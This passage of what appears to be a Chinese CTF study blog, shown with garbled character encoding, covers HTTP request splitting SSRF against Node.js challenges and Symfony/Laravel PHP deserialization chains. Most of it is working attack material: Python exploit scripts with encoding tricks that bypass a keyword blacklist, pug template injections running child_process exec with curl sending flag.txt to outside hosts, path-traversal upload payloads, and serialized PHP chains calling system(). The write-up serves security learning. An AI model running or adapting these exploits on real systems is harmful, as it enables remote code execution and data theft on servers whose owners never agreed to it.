(q) { var url = \u0026#39;http://localhost:8081/getMeme?\u0026#39; + q console.log(url) var trigger = blacklist(url); if (trigger === true) { res.send(\u0026#34;\u0026lt;p\u0026gt;Errrrr, You have been Blocked\u0026lt;/p\u0026gt;\u0026#34;); } else { try { http.get(url, function(resp) { resp.setEncoding(\u0026#39;utf8\u0026#39;); resp.on(\u0026#39;error\u0026#39;, function(err) { if (err.code === \u0026#34;ECONNRESET\u0026#34;) { console.log(\u0026#34;Timeout occurs\u0026#34;); return; } }); resp.on(\u0026#39;data\u0026#39;, function(chunk) { resps = chunk.toString(); res.send(resps); }).on(\u0026#39;error\u0026#39;, (e) =\u0026gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\u0026#34;search param \u0026#39;q\u0026#39; missing!\u0026#34;); } }) function blacklist(url) { var evilwords = [\u0026#34;global\u0026#34;, \u0026#34;process\u0026#34;,\u0026#34;mainModule\u0026#34;,\u0026#34;require\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;child_process\u0026#34;,\u0026#34;exec\u0026#34;,\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;!\u0026#34;]; var arrayLen = evilwords.length; for (var i = 0; i \u0026lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } } } var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\u0026#34;Example app listening at http://%s:%s\u0026#34;, host, port) }) å¦‚æœä¸Šä¸€ä¸ªé¢˜ä»”ç»†åˆ†æçš„è¯å°±ä¼šå‘ç°è¿™ä¸ªé¢˜åªæ˜¯ä»£ç åšäº†ä¸€äº›å¾®å°çš„æ”¹åŠ¨\néœ€è¦å¤šæ„é€ ä¸€ä¸ªè¯·æ±‚å¤´ï¼Œæ¢è¡Œçš„CRLFå’Œç©ºæ ¼SPæˆ‘ä»¬ç”¨unicodeï¼Œè€Œpugæ‰§è¡Œå‘½ä»¤çš„éƒ¨åˆ†æˆ‘ä»¬å¯ä»¥ç”¨å…«è¿›åˆ¶å­—ç¬¦\n[][\u0026#34;constructor\u0026#34;]\t// valid [][\u0026#34;constructor\u0026#34;][\u0026#34;constructor\u0026#34;](\u0026#34;evalcode\u0026#34;)() [][\u0026#34;\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\u0026#34;]\t// valid,executable [][\\42\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\\42]\t// invalid,since \u0026#34; is encoded pugæ¨¡æ¿ä¸¤ç§å½¢å¼\n#{shellcode} - shellcode å†™ä¸€ä¸ªå¤–å¸¦flagçš„payload\n-[][\u0026#34;constructor\u0026#34;][\u0026#34;constructor\u0026#34;](\u0026#34;console.log(this.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl 172.19.0.1:8888 -X POST -d @flag.txt\u0026#39;))\u0026#34;)() æˆ‘æ ¹æ®è¿™ä½å¤§ä½¬çš„py2ç‰ˆexp.pyå†™äº†ä¸€ä¸ªpy3ç‰ˆæœ¬çš„ï¼Œå¹¶ä¸”æ”¹çš„ç®€æ´äº†ä¸€äº›ï¼ˆæœ‰äº†ä¸€äº›é€šç”¨æ€§ï¼Œä½†æ˜¯ç”±äºè¿˜æ˜¯éƒ¨åˆ†unicodeç¼–ç ï¼Œæ€»ä½“ä¸Šä¸å¦‚å…¨ç¼–ç çš„ç¨³\nimport requests from requests.utils import quote url = \u0026#39;\u0026#39; charset = \u0026#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39; SPACE = u\u0026#39;\\u0120\u0026#39; CRLF = u\u0026#39;\\u010d\\u010a\u0026#39; SLASH = u\u0026#39;\\u012f\u0026#39; # ä»…å¯¹å­—æ¯è¿›è¡Œç¼–ç  def str2Oct(str): r = \u0026#39;\u0026#39; for i in str: if i in charset: r += \u0026#39;\\\\\u0026#39; + oct(ord(i))[1:] else: r += i return r.replace(\u0026#39;o\u0026#39;, \u0026#39;\u0026#39;) _pug = \u0026#39;\u0026#39;\u0026#39;-[][\u0026#34;constructor][\u0026#34;constructor](\u0026#34;console.log(this.process.mainModule.require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;curl http://ip:port/ -d @/flag.txt\u0026#39;))\u0026#34;)()\u0026#39;\u0026#39;\u0026#39; pug = str2Oct(_pug).replace(\u0026#39;\u0026#34;\u0026#39;, \u0026#39;%22\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;, \u0026#34;%27\u0026#34;) # print(pug) # print(quote(pug)) payload = f\u0026#39;\u0026#39;\u0026#39;amiz HTTP/1.1 GET /flag HTTP/1.1 x-forwarded-for: 127.0.0.1 adminauth: secretpassword pug: {pug} test: \u0026#39;\u0026#39;\u0026#39;.replace(\u0026#39; \u0026#39;, f\u0026#39;{SPACE}\u0026#39;).replace(\u0026#39;/\u0026#39;, f\u0026#39;{SLASH}\u0026#39;).replace(\u0026#39;\\n\u0026#39;, f\u0026#39;{CRLF}\u0026#39;) print(payload) r = requests.session() result = r.get(\u0026#39;url\u0026#39; + quote(payload)) print(result.content) æœ¬åœ°å¤ç°æˆåŠŸ\n[GYCTF2020]Node Game var express = require(\u0026#39;express\u0026#39;); var app = express(); var fs = require(\u0026#39;fs\u0026#39;); var path = require(\u0026#39;path\u0026#39;); var http = require(\u0026#39;http\u0026#39;); var pug = require(\u0026#39;pug\u0026#39;); var morgan = require(\u0026#39;morgan\u0026#39;); const multer = require(\u0026#39;multer\u0026#39;); app.use(multer({dest: \u0026#39;./dist\u0026#39;}).array(\u0026#39;file\u0026#39;)); app.use(morgan(\u0026#39;short\u0026#39;)); // ç®€åŒ–ç‰ˆæ—¥å¿— app.use(\u0026#34;/uploads\u0026#34;,express.static(path.join(__dirname, \u0026#39;/uploads\u0026#39;))) app.use(\u0026#34;/template\u0026#34;,express.static(path.join(__dirname, \u0026#39;/template\u0026#39;))) app.get(\u0026#39;/\u0026#39;, function(req, res) { var action = req.query.action?req.query.action:\u0026#34;index\u0026#34;; // actionå‚æ•° if( action.includes(\u0026#34;/\u0026#34;) || action.includes(\u0026#34;\\\\\u0026#34;) ){ // ä¸èƒ½æœ‰/ \\ res.send(\u0026#34;Errrrr, You have been Blocked\u0026#34;); } file = path.join(__dirname + \u0026#39;/template/\u0026#39;+ action +\u0026#39;.pug\u0026#39;); var html = pug.renderFile(file); // æ¨¡æ¿æ¸²æŸ“ res.send(html); }); app.post(\u0026#39;/file_upload\u0026#39;, function(req, res){ var ip = req.connection.remoteAddress; var obj = { msg: \u0026#39;\u0026#39;, } if (!ip.includes(\u0026#39;127.0.0.1\u0026#39;)) { // éœ€è¦SSRF obj.msg=\u0026#34;only admin\u0026#39;s ip can use it\u0026#34; res.send(JSON.stringify(obj)); return } fs.readFile(req.files[0].path, function(err, data){ if(err){ obj.msg = \u0026#39;upload failed\u0026#39;; res.send(JSON.stringify(obj)); }else{ var file_path = \u0026#39;/uploads/\u0026#39; + req.files[0].mimetype +\u0026#34;/\u0026#34;; // è·¯å¾„ç¡®å®š mimetypeå¯æ§ è·¯å¾„ç©¿è¶Š var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path)){ try { fs.mkdirSync(__dirname + file_path) } catch (error) { obj.msg = \u0026#34;file type error\u0026#34;; res.send(JSON.stringify(obj)); return } } try { fs.writeFileSync(dir_file,data) obj = { msg: \u0026#39;upload success\u0026#39;, filename: file_path + file_name } } catch (error) { obj.msg = \u0026#39;upload failed\u0026#39;; } res.send(JSON.stringify(obj)); } }) }) app.get(\u0026#39;/source\u0026#39;, function(req, res) { // æºç  res.sendFile(path.join(__dirname + \u0026#39;/template/source.txt\u0026#39;)); }); app.get(\u0026#39;/core\u0026#39;, function(req, res) { var q = req.query.q; // qå‚æ•° var resp = \u0026#34;\u0026#34;; if (q) { var url = \u0026#39;http://localhost:8081/source?\u0026#39; + q // å¯æ§ç«¯ç‚¹ console.log(url) var trigger = blacklist(url); // é»‘åå•è¿‡æ»¤ if (trigger === true) { res.send(\u0026#34;\u0026lt;p\u0026gt;error occurs!\u0026lt;/p\u0026gt;\u0026#34;); } else { try { http.get(url, function(resp) { resp.setEncoding(\u0026#39;utf8\u0026#39;); resp.on(\u0026#39;error\u0026#39;, function(err) { if (err.code === \u0026#34;ECONNRESET\u0026#34;) { console.log(\u0026#34;Timeout occurs\u0026#34;); return; } }); resp.on(\u0026#39;data\u0026#39;, function(chunk) { try { resps = chunk.toString(); res.send(resps); }catch (e) { res.send(e.message); } }).on(\u0026#39;error\u0026#39;, (e) =\u0026gt; { res.send(e.message);}); }); } catch (error) { console.log(error); } } } else { res.send(\u0026#34;search param \u0026#39;q\u0026#39; missing!\u0026#34;); } }) function blacklist(url) {\t// urlencodeç»•è¿‡ å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡ unicodeç»•è¿‡ var evilwords = [\u0026#34;global\u0026#34;, \u0026#34;process\u0026#34;,\u0026#34;mainModule\u0026#34;,\u0026#34;require\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;child_process\u0026#34;,\u0026#34;exec\u0026#34;,\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;\u0026#39;\u0026#34;,\u0026#34;!\u0026#34;]; var arrayLen = evilwords.length; for (var i = 0; i \u0026lt; arrayLen; i++) { const trigger = url.includes(evilwords[i]); if (trigger === true) { return true } } } var server = app.listen(8081, function() { var host = server.address().address var port = server.address().port console.log(\u0026#34;Example app listening at http://%s:%s\u0026#34;, host, port) }) æœ‰ä¸Šé¢ä¸¤ä¸ªé¢˜çš„é“ºå«ï¼Œè¿™ä¸ªä»£ç å°±ä¼šå¥½ç†è§£ä¸€äº›\nè¿™ä¸ªé¢˜æ”¹ç¼–çš„åœ°æ–¹åœ¨äºå¤šäº†ä¸€ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ ï¼Œå¯ä»¥é€šè¿‡../çš„mimetypeæ¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œpugæ¸²æŸ“ä¼šå€ŸåŠ©æˆ‘ä»¬ä¸Šä¼ çš„.pugæ¨¡æ¿ï¼Œåœ¨è¿™é‡ŒåŒ…å«flag.txt\né€šè¿‡æŠ“åŒ…ä¿®æ”¹å†…å®¹æ¥åšpayload\nHTTP/1.1 Host: amiz Connection: keep-alive POST /file_upload HTTP/1.1 Host: amiz Content-Length: 266 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf Cache-control: no-cache Connection: keep-alive ------WebKitFormBoundary4RZFWBFQ4MBn61cf Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;amiz.pug\u0026#34; Content-Type: /../template doctype html html head style include ../../../../../../../flag.txt ------WebKitFormBoundary4RZFWBFQ4MBn61cf-- GET /flag HTTP/1.1 Host: amiz Connection: close amiz: ä½¿ç”¨ä¸Šé¢æˆ‘ä»¬å·²ç»æ„é€ å¥½çš„é€šç”¨exp.pyæ„é€ payload\nimport requests from requests.utils import quote url = \u0026#39;http://5214b607-8520-4572-9bfc-d289a0e0c4f8.node4.buuoj.cn:81/core?q=\u0026#39; SPACE = u\u0026#39;\\u0120\u0026#39; CRLF = u\u0026#39;\\u010d\\u010a\u0026#39; SLASH = u\u0026#39;\\u012f\u0026#39; DOUBLE_MARK = u\u0026#39;\\u0122\u0026#39; SINGLE_MARK = u\u0026#39;\\u0127\u0026#39; _payload = \u0026#39;\u0026#39;\u0026#39;HTTP/1.1 Host: amiz Connection: keep-alive POST /file_upload HTTP/1.1 Host: amiz Content-Length: 266 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf Cache-control: no-cache Connection: keep-alive ------WebKitFormBoundary4RZFWBFQ4MBn61cf Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;amiz.pug\u0026#34; Content-Type: /../template doctype html html head style include ../../../../../../../flag.txt ------WebKitFormBoundary4RZFWBFQ4MBn61cf-- GET /flag HTTP/1.1 Host: amiz Connection: close amiz: \u0026#39;\u0026#39;\u0026#39; payload = _payload.replace(\u0026#39; \u0026#39;, f\u0026#39;{SPACE}\u0026#39;).replace(\u0026#39;\\n\u0026#39;, f\u0026#39;{CRLF}\u0026#39;).replace(\u0026#39;/\u0026#39;, f\u0026#39;{SLASH}\u0026#39;).replace(\u0026#39;\u0026#34;\u0026#39;, f\u0026#39;{DOUBLE_MARK}\u0026#39;).replace(\u0026#34;\u0026#39;\u0026#34;, f\u0026#39;{SINGLE_MARK}\u0026#39;) print(payload) result = requests.get(url + quote(payload)) print(result.text) æˆåŠŸå¾—åˆ°flagï¼Œæœ¬åœ°æŠ“åŒ…çœ‹ä¸€ä¸‹å…·ä½“æƒ…å†µ\nåœ¨expä¸­æˆ‘ä»¬å¯¹ä¸€äº›ç‰¹æ®Šå­—ç¬¦åšäº†unicodeç¼–ç ï¼Œè¢«ç¼–ç çš„å­—ç¬¦åº”è¯¥åŒ…æ‹¬ä»¥ä¸‹è¿™äº›\n! \u0026amp; ` ; + \\ / \u0026#34; \u0026#39; \u0026lt;SPACE\u0026gt; \u0026lt;CRLF\u0026gt; ï¼ˆï¼ï¼ï¼æ³¨æ„ è¿™é‡Œå¾ˆå¯èƒ½æœ‰é—æ¼æˆ–è€…ä¸å¿…è¦çš„ è¯·æ ¹æ®å®é™…æƒ…å†µä¿®æ”¹\nä¸‹é¢æ˜¯å®Œå…¨ç¼–ç çš„exp.py\nimport urllib.parse import requests _payload = \u0026#39;\u0026#39;\u0026#39;amiz HTTP/1.1 Host: amiz Connection: keep-alive POST /file_upload HTTP/1.1 Host: amiz Content-Length: 266 Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4RZFWBFQ4MBn61cf Cache-control: no-cache Connection: keep-alive ------WebKitFormBoundary4RZFWBFQ4MBn61cf Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;amiz.pug\u0026#34; Content-Type: ../template doctype html html head style include ../../../../../../../flag.txt ------WebKitFormBoundary4RZFWBFQ4MBn61cf-- \u0026#39;\u0026#39;\u0026#39; payload = _payload.replace(\u0026#34;\\n\u0026#34;, \u0026#34;\\r\\n\u0026#34;) payload = \u0026#39;\u0026#39;.join(chr(int(\u0026#39;0xff\u0026#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload) print(payload) r = requests.get(\u0026#39;http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=\u0026#39; + urllib.parse.quote(payload)) print(r.text) å°†ä¼šæ„é€ å‡ºè¿™ç§ç©æ„\nå¦å¤–pugæ¨¡æ¿é™¤äº†åŒ…å«flag.txtä»¥å¤–è¿˜å¯ä»¥è·Ÿä¸Šé¢nullconçš„é¢˜ä¸€æ ·ç”¨curlè¯·æ±‚æ¥å¤–å¸¦flagï¼›ç¨å¾®ä¿®æ”¹ä¸€ä¸‹expå³å¯\næ”¾ä¸€ä¸‹å®˜æ–¹exp.py\nimport requests import sys payloadRaw = \u0026#34;\u0026#34;\u0026#34;x HTTP/1.1 POST /file_upload HTTP/1.1 Host: localhost:8081 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942 Content-Length: 6279 Origin: http://localhost:8081 Connection: close Referer: http://localhost:8081/?action=upload Upgrade-Insecure-Requests: 1 -----------------------------12837266501973088788260782942 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;5am3_get_flag.pug\u0026#34; Content-Type: ../template - global.process.mainModule.require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;evalcmd\u0026#39;) -----------------------------12837266501973088788260782942-- \u0026#34;\u0026#34;\u0026#34; def getParm(payload): payload = payload.replace(\u0026#34; \u0026#34;,\u0026#34;%C4%A0\u0026#34;) payload = payload.replace(\u0026#34;\\n\u0026#34;,\u0026#34;%C4%8D%C4%8A\u0026#34;) payload = payload.replace(\u0026#34;\\\u0026#34;\u0026#34;,\u0026#34;%C4%A2\u0026#34;) payload = payload.replace(\u0026#34;\u0026#39;\u0026#34;,\u0026#34;%C4%A7\u0026#34;) payload = payload.replace(\u0026#34;`\u0026#34;,\u0026#34;%C5%A0\u0026#34;) payload = payload.replace(\u0026#34;!\u0026#34;,\u0026#34;%C4%A1\u0026#34;) payload = payload.replace(\u0026#34;+\u0026#34;,\u0026#34;%2B\u0026#34;) payload = payload.replace(\u0026#34;;\u0026#34;,\u0026#34;%3B\u0026#34;) payload = payload.replace(\u0026#34;\u0026amp;\u0026#34;,\u0026#34;%26\u0026#34;) # Bypass Waf payload = payload.replace(\u0026#34;global\u0026#34;,\u0026#34;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC\u0026#34;) payload = payload.replace(\u0026#34;process\u0026#34;,\u0026#34;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\u0026#34;) payload = payload.replace(\u0026#34;mainModule\u0026#34;,\u0026#34;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5\u0026#34;) payload = payload.replace(\u0026#34;require\u0026#34;,\u0026#34;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5\u0026#34;) payload = payload.replace(\u0026#34;root\u0026#34;,\u0026#34;%C5%B2%C5%AF%C5%AF%C5%B4\u0026#34;) payload = payload.replace(\u0026#34;child_process\u0026#34;,\u0026#34;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3\u0026#34;) payload = payload.replace(\u0026#34;exec\u0026#34;,\u0026#34;%C5%A5%C5%B8%C5%A5%C5%A3\u0026#34;) return payload def run(url,cmd): payloadC = payloadRaw.replace(\u0026#34;evalcmd\u0026#34;,cmd) urlC = url+\u0026#34;/core?q=\u0026#34;+getParm(payloadC) requests.get(urlC) requests.get(url+\u0026#34;/?action=5am3_get_flag\u0026#34;).text if __name__ == \u0026#39;__main__\u0026#39;: targetUrl = sys.argv[1] cmd = sys.argv[2] print run(targetUrl,cmd) # python exp.py http://127.0.0.1:8081 \u0026#34;curl eval.com -X POST -d `cat /flag.txt`\u0026#34; å®ä¸ç›¸ç’ï¼Œæˆ‘è¢«éƒ¨åˆ†ç¼–ç æ—¶åº”è¯¥ç¼–å“ªä¸€äº›è¿™ä¸ªé—®é¢˜å›°æ‰°äº†ä¸€å¤©ï¼Œç»å†äº†næ¬¡çš„ç¯å¢ƒå´©æºƒå’Œå¥½å¤šå¥½å¤šä»¤äººæ— è¯­çš„æƒ…å†µï¼›å…¶å®ç”¨å…¨ç¼–ç å°±æ˜¯æœ€ç®€å•å¿«æ·çš„ï¼Œä½†æ˜¯è¿˜æ˜¯æƒ³è‡ªå·±æŠ˜è…¾ä¸€ä¸‹\nè¿™ä¸ªç³»åˆ—ä¸‹ä¸€ç¯‡åº”è¯¥æ˜¯HTTPè¯·æ±‚èµ°ç§æˆ–è€…æ˜¯302è·³è½¬ssrfç›¸å…³çš„ï¼Œä¸è¿‡è¿‘æœŸåº”è¯¥æ˜¯ä¸ä¼šå†ç¢°jsäº†ï¼Œåƒåœ¾Node.jsï¼Œæ¯æˆ‘é’æ˜¥\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ CAPEC-220: Client-Server Protocol Manipulation | CAPEC-105: HTTP Request Splitting | CAPEC-33: HTTP Request Smuggling\nhttp: add \u0026ndash;security-revert for CVE-2018-12116\nSecurity Bugs in Practice: SSRF via Request Splitting\nA New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!\nMembershop - docker | Split second - docker | Node Game - docker\nProxy-Proxy - wp | Membershop - wp | Split second - wp1 | Split second - wp2 | Split second - wp3 | Node Game - wp\n","date":"2021-12-07T02:24:15+08:00","permalink":"https://amiaaaz.github.io/2021/12/07/http-request-splitting-attack-study-notes/","section":"posts","tags":["SSRF","Node.js"],"title":"HTTPè¯·æ±‚åˆ‡åˆ†æ”»å‡»å­¦ä¹ ç¬”è®°"},{"categories":["NOTES\u0026SUMMARY"],"contents":"äº²è‡ªä»å¤´åˆ°å°¾è·Ÿäº†ä¸€ä¸‹æ¶‰åŠåˆ°çš„ä¸‰ä¸ªé“¾å­ï¼Œç¨å¾®æ‹¯æ•‘äº†ä¸€ç‚¹ç‚¹ç‚¹ç‚¹æˆ‘ç¨€çƒ‚çš„ä»£ç å®¡è®¡èƒ½åŠ›\nå‚è€ƒé“¾æ¥æ”¾åœ¨æ–‡æœ«\né“¾å­1 - æ–‡ä»¶åŒ…å«/ä»»æ„æ–‡ä»¶è¯»å– æœç´¢__desturct()æ‰¾å…¥æ‰‹ç‚¹ï¼Œ vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php\nå®ƒè°ƒç”¨äº†commit()å’ŒinvalidateTags()\nè°ƒç”¨poolçš„saveDeferred()æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨è¿™ä¸ªç±»ç›¸åŒå‘½åç©ºé—´(Symfony\\Component\\Cache\\Adapter)ä¸‹æ‰¾æœ‰æ²¡æœ‰åˆ«çš„ç±»ä¹Ÿå®ç°äº†è¿™ä¸ªæ–¹æ³•ï¼Œå¦å¤–å¼€å§‹çš„é‚£ä¸ªpoolæ˜¯åœ¨Adapteræ¥å£ä¸‹ï¼Œæ‰€ä»¥è¦æ‰¾ä¸€ä¸ªAdapterInterfaceæ¥å£å¹¶ä¸”å­˜åœ¨saveDeferred()çš„ç±»\næ‰¾åˆ°è¿™é‡Œvendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php\nå®ƒåˆè°ƒç”¨äº†initialize()ï¼Œè·Ÿè¿› vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php\næ˜¯æˆ‘ä»¬çš„æ–‡ä»¶åŒ…å«ç‚¹äº†ï¼Œå¯ä»¥ä»è¿™é‡Œè¯»flag\næ¥ä¸‹æ¥å°±æ˜¯æ„é€ expäº†ï¼Œè¦æ³¨æ„å‘½åç©ºé—´å’Œæ¥å£\nå‰ä¸¤ä¸ªç±»éƒ½æ˜¯Symfony\\Component\\Cache\\Adapterå‘½åç©ºé—´ä¸‹çš„ï¼Œä½†æ˜¯CacheItemæ˜¯Symfony\\Component\\Cacheä¸‹çš„ï¼Œæ‰€ä»¥è¦å†å¼•å…¥å®ƒï¼Œuse\n\u0026lt;?php namespace Symfony\\Component\\Cache{ final class CacheItem{ } } namespace Symfony\\Component\\Cache\\Adapter{ use Symfony\\Component\\Cache\\CacheItem; class PhpArrayAdapter{ private $file=\u0026#39;/flag\u0026#39;; } class TagAwareAdapter{ private $deferred; private $pool; public function __construct(){ $this-\u0026gt;deferred = array(\u0026#39;amiz\u0026#39; =\u0026gt; new CacheItem()); $this-\u0026gt;pool = new PhpArrayAdapter(); } } $a = new TagAwareAdapter(); echo urlencode(serialize($a)); } é“¾å­2 - rce å›åˆ°å‰é¢åœ¨ç›¸åŒå‘½åç©ºé—´ä¸‹æ‰¾saveDeferred()çš„åœ°æ–¹ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªç±»ä¹Ÿæœ‰åŒæ ·çš„æ–¹æ³• vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php\nè·Ÿè¿›doSave()\n223è¡Œå¯ä»¥åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼ŒsetInnerItemå¯æ§ æˆ‘ä»¬å¯ä»¥è°ƒç”¨system()ï¼Œæ¥ä¸‹æ¥ç¡®è®¤å®ƒè°ƒç”¨çš„ä¸¤ä¸ªå‚æ•°å¯ä¸å¯æ§\nå¯¹äº$itemï¼Œæ˜¯è°ƒç”¨å‡½æ•°doSave()å‡½æ•°æ—¶ä¼ å…¥çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯saveDeferred()æ—¶çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„æ•°ç»„ï¼Œå¯æ§\nå¯¹äº$innerItemæœ‰è¿™æ ·ä¸€ä¸ªifåˆ¤æ–­\nå…‰çœ‹è¿™ä¸ªåˆ¤æ–­è‚¥è‚ çš„çªå…€ï¼Œè¿˜è¦ç»“åˆ207è¡Œçš„$item = (array) $item;ï¼Œå®ƒå°†ä¸€ä¸ªç±»å¼ºè¡Œè½¬æ¢æˆæ•°ç»„ï¼Œè€Œåé¢è·Ÿç€çš„è¿™ä¸ªifåˆ¤æ–­å°±æ˜¯ä¸ºäº†è§£å†³ç±»ä¸­åŸæœ‰çš„ protectedçš„å±æ€§å†²çªï¼Œæ‰€ä»¥éœ€è¦åœ¨ç›¸åŒçš„å‘½åç©ºé—´é‡Œæ¥ç€æ‰¾ä¸€ä¸ªç±»ï¼ŒåŒ…å«pollHashå’ŒinnerItemå±æ€§ï¼Œæœ€ç»ˆè¿˜æ˜¯æ‰¾åˆ°äº†CacheItemï¼ˆå‰é¢ä¹Ÿæ˜¯å®ƒ\næ„é€ exp\n\u0026lt;?php namespace Symfony\\Component\\Cache{ final class CacheItem { protected $expiry; protected $poolHash; protected $innerItem; public function __construct($expiry, $poolHash, $command) { $this-\u0026gt;expiry = $expiry; $this-\u0026gt;poolHash = $poolHash; $this-\u0026gt;innerItem = $command; } } } namespace Symfony\\Component\\Cache\\Adapter{ class ProxyAdapter { private $poolHash; private $setInnerItem; public function __construct($poolHash, $func) { $this-\u0026gt;poolHash = $poolHash; $this-\u0026gt;setInnerItem = $func; } } class TagAwareAdapter { private $deferred = []; private $pool; public function __construct($deferred, $pool) { $this-\u0026gt;deferred = $deferred; $this-\u0026gt;pool = $pool; } } } namespace { $cacheitem = new Symfony\\Component\\Cache\\CacheItem(1,1,\u0026#34;dir\u0026#34;); $proxyadapter = new Symfony\\Component\\Cache\\Adapter\\ProxyAdapter(1,\u0026#39;system\u0026#39;); $tagawareadapter = new Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter(array($cacheitem),$proxyadapter); echo urlencode(serialize($tagawareadapter)); } æœ¬åœ°å°è¯•ä¸€ä¸‹ï¼ˆæ‡’å¾—å†å¼€é¶æœºäº†w\næˆåŠŸäº†æ\né“¾å­3 - rce åœ¨ [CISCN2019 æ€»å†³èµ› Day1 Web4]Laravel1è¿™é“é¢˜é‡Œèµµå¸ˆå‚…æŠŠè¿™æ¡è·¯å µæ­»äº†ï¼Œä½†æ˜¯æœ¬åœ°å¤ç°æ— æ‰€è°“å•¦\næŠŠè¿™ä¸ªæ³¨é‡Šå–æ¶ˆå³å¯\nçœ‹åˆ°å®ƒè°ƒç”¨äº†eventsçš„dispatchæ–¹æ³•ï¼Œè·Ÿä¸Šé¢æ€è·¯ä¸€æ ·ï¼Œæ¥ç€æ‰¾ä¸€ä¸ªå¯ç”¨çš„åˆ«çš„ç±»é‡Œçš„dispatchï¼Œæ¯”å¦‚vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php\nçœ‹ä¸€ä¸‹ç¬¬ä¸€ä¸ªåˆ¤æ–­çš„è¿”å›æ—¶è°ƒç”¨çš„dispatchNow()æ˜¯ä»€ä¹ˆ\n150è¡Œæœ‰äº®ç‚¹å•Šï¼Œä½¿ç”¨äº†call_user_funcï¼Œç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œç¬¬äºŒä¸ªå‚æ•°æ¥è‡ª$commandï¼Œä¹Ÿå°±æ˜¯æœ€å¼€å§‹æ‰¾çš„ææ„å‡½æ•°è°ƒç”¨çš„$this-\u0026gt;eventï¼›ç°åœ¨è¦æ‰¾ä¸€ä¸ªç±» å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç„¶åæˆ‘ä»¬çš„rceå‘½ä»¤ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ï¼Œå®Œæˆæ•´ä¸ªé“¾å­\nä¸è¿‡å…ˆä¸æ€¥ï¼Œé¦–å…ˆè¦æ»¡è¶³dispatch()ä¸­çš„ifåˆ¤æ–­$this-\u0026gt;queueResolver \u0026amp;\u0026amp; $this-\u0026gt;commandShouldBeQueued($command)ï¼Œå‰ä¸€ä¸ªå¯æ§ï¼Œçœ‹çœ‹åé¢è¿™ä¸ª\néœ€è¦$commandå¿…é¡»æ˜¯ä¸€ä¸ªå®ç°äº†ShouldQueueæ¥å£çš„ç±»ï¼Œæ‰¾åˆ°è¿™ä¸ª vendor/laravel/framework/src/Illuminate/Foundation/Console/QueuedCommand.php\nç„¶åæ¥ç€æ‰¾é€‚åˆåšcall_user_func()ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»ï¼Œå®ƒéœ€è¦å¯ä»¥æ‰§è¡Œä»»æ„å‡½æ•° vendor/mockery/mockery/library/Mockery/Loader/EvalLoader.php\nè¿™ä¸ªload()å¯ä»¥ç›´æ¥è°ƒç”¨evalæ‰§è¡Œä»£ç 